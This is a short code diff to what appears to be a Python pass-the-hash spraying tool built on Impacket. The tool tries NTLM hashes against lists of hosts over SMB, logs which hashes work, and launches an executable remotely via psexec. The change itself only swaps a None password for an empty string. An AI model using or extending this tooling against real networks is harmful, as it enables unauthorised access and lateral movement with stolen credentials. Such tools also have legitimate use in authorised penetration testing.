@@ -1,5 +1,4 @@
 #!/usr/bin/python
-# 1.4
 import psexec
 import time
 import blessings
@@ -32,7 +31,7 @@ t = blessings.Terminal()
 
 def StartPsexec(exeFile, targetusername, psexechash, targetdomain, psexecip):
     PSEXEC = psexec.PSEXEC(command="", path="", exeFile=exeFile, copyFile="", protocols=None, username=targetusername,
-                           hashes=psexechash, domain=targetdomain, password=None, aesKey=None, doKerberos=False)
+                           hashes=psexechash, domain=targetdomain, password='', aesKey=None, doKerberos=False)
     print t.bold_green + "\n[*] Starting Psexec...." + t.normal
     try:
         time.sleep(7)
@@ -85,7 +84,7 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
                 print E
                 continue
             try:
-                smb.login(user=targetusername, password=None,
+                smb.login(user=targetusername, password='',
                           domain=targetdomain, lmhash=targetlm, nthash=targetnt)
                 print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.normal
                 workinghashes.append(hash + "," + ip)
